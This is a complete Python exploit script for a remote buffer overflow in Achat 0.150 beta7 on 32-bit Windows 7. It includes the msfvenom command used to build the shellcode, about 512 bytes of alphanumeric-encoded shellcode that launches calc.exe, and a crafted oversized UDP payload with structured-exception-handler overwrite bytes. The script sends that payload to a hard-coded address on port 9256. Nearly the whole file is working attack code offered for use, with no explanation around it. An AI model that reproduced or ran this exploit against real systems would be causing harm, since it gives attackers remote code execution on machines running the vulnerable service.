#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  ""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x4b\x4c\x77\x78\x63\x52"
buf += b"\x6b\x50\x6d\x30\x6d\x30\x53\x30\x64\x49\x49\x55\x70"
buf += b"\x31\x45\x70\x63\x34\x44\x4b\x52\x30\x50\x30\x72\x6b"
buf += b"\x4f\x62\x6a\x6c\x34\x4b\x61\x42\x4a\x74\x64\x4b\x43"
buf += b"\x42\x6d\x58\x4c\x4f\x48\x37\x4d\x7a\x4b\x76\x6e\x51"
buf += b"\x39\x6f\x74\x6c\x4f\x4c\x53\x31\x43\x4c\x79\x72\x6c"
buf += b"\x6c\x6b\x70\x75\x71\x56\x6f\x7a\x6d\x6a\x61\x48\x47"
buf += b"\x4b\x32\x78\x72\x61\x42\x51\x47\x64\x4b\x72\x32\x5a"
buf += b"\x70\x72\x6b\x50\x4a\x6f\x4c\x54\x4b\x6e\x6c\x6c\x51"
buf += b"\x72\x58\x78\x63\x4f\x58\x7a\x61\x78\x51\x30\x51\x44"
buf += b"\x4b\x52\x39\x6b\x70\x4b\x51\x78\x53\x52\x6b\x4e\x69"
buf += b"\x6d\x48\x67\x73\x4f\x4a\x31\x39\x42\x6b\x6e\x54\x42"
buf += b"\x6b\x4b\x51\x69\x46\x6e\x51\x39\x6f\x76\x4c\x67\x51"
buf += b"\x38\x4f\x5a\x6d\x4b\x51\x77\x57\x4f\x48\x49\x50\x53"
buf += b"\x45\x6a\x56\x4b\x53\x71\x6d\x48\x78\x6d\x6b\x71\x6d"
buf += b"\x6c\x64\x52\x55\x38\x64\x42\x38\x42\x6b\x61\x48\x4c"
buf += b"\x64\x39\x71\x5a\x33\x4f\x76\x64\x4b\x6a\x6c\x6e\x6b"
buf += b"\x64\x4b\x30\x58\x4b\x6c\x4b\x51\x48\x53\x32\x6b\x4a"
buf += b"\x64\x34\x4b\x49\x71\x66\x70\x31\x79\x31\x34\x4b\x74"
buf += b"\x6b\x74\x4f\x6b\x61\x4b\x43\x31\x42\x39\x31\x4a\x52"
buf += b"\x31\x69\x6f\x47\x70\x61\x4f\x61\x4f\x4e\x7a\x32\x6b"
buf += b"\x7a\x72\x78\x6b\x54\x4d\x6f\x6d\x42\x48\x70\x33\x4e"
buf += b"\x52\x6d\x30\x6b\x50\x70\x68\x72\x57\x42\x53\x4d\x62"
buf += b"\x31\x4f\x6f\x64\x70\x68\x4e\x6c\x43\x47\x4d\x56\x6d"
buf += b"\x37\x54\x49\x38\x68\x4b\x4f\x4a\x30\x78\x38\x42\x70"
buf += b"\x69\x71\x6b\x50\x49\x70\x4c\x69\x39\x34\x4e\x74\x72"
buf += b"\x30\x62\x48\x4e\x49\x65\x30\x62\x4b\x49\x70\x49\x6f"
buf += b"\x37\x65\x30\x6a\x7a\x6a\x32\x48\x39\x7a\x4b\x5a\x6c"
buf += b"\x4e\x5a\x69\x73\x38\x6b\x52\x4d\x30\x4c\x44\x66\x72"
buf += b"\x32\x69\x59\x56\x50\x50\x50\x50\x42\x30\x70\x50\x4d"
buf += b"\x70\x6e\x70\x6f\x50\x32\x30\x51\x58\x37\x7a\x4c\x4f"
buf += b"\x49\x4f\x39\x50\x4b\x4f\x47\x65\x32\x77\x52\x4a\x5a"
buf += b"\x70\x71\x46\x6e\x77\x4f\x78\x54\x59\x64\x65\x51\x64"
buf += b"\x50\x61\x4b\x4f\x39\x45\x31\x75\x75\x70\x54\x34\x4c"
buf += b"\x4a\x59\x6f\x4e\x6e\x59\x78\x31\x65\x58\x6c\x6a\x48"
buf += b"\x73\x37\x69\x70\x79\x70\x49\x70\x52\x4a\x69\x70\x70"
buf += b"\x6a\x69\x74\x52\x36\x6f\x67\x73\x38\x4c\x42\x38\x59"
buf += b"\x65\x78\x31\x4f\x39\x6f\x38\x55\x54\x43\x49\x68\x59"
buf += b"\x70\x73\x4e\x4c\x76\x54\x4b\x30\x36\x30\x6a\x6d\x70"
buf += b"\x52\x48\x59\x70\x4e\x30\x49\x70\x49\x70\x6e\x76\x70"
buf += b"\x6a\x6d\x30\x31\x58\x51\x48\x43\x74\x50\x53\x59\x55"
buf += b"\x4b\x4f\x69\x45\x33\x63\x4e\x73\x42\x4a\x6b\x50\x4e"
buf += b"\x76\x42\x33\x4e\x77\x31\x58\x6d\x32\x46\x79\x46\x68"
buf += b"\x51\x4f\x69\x6f\x7a\x35\x53\x53\x49\x68\x4d\x30\x33"
buf += b"\x4d\x4b\x78\x51\x48\x4f\x78\x49\x70\x4d\x70\x39\x70"
buf += b"\x6b\x50\x72\x4a\x4b\x50\x72\x30\x62\x48\x6a\x6b\x4c"
buf += b"\x6f\x4a\x6f\x6e\x50\x79\x6f\x59\x45\x6e\x77\x73\x38"
buf += b"\x44\x35\x62\x4e\x50\x4d\x73\x31\x6b\x4f\x36\x75\x31"
buf += b"\x4e\x61\x4e\x69\x6f\x7a\x6c\x6f\x34\x5a\x6f\x32\x65"
buf += b"\x72\x50\x49\x6f\x59\x6f\x49\x6f\x6b\x39\x33\x6b\x6b"
buf += b"\x4f\x39\x6f\x4b\x4f\x4d\x31\x67\x53\x6f\x39\x35\x76"
buf += b"\x72\x55\x66\x61\x36\x63\x35\x6b\x48\x70\x74\x75\x75"
buf += b"\x52\x72\x36\x52\x4a\x6b\x50\x6e\x73\x4b\x4f\x4a\x35"
buf += b"\x41\x41"
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
print "Sent: "+str(sent)
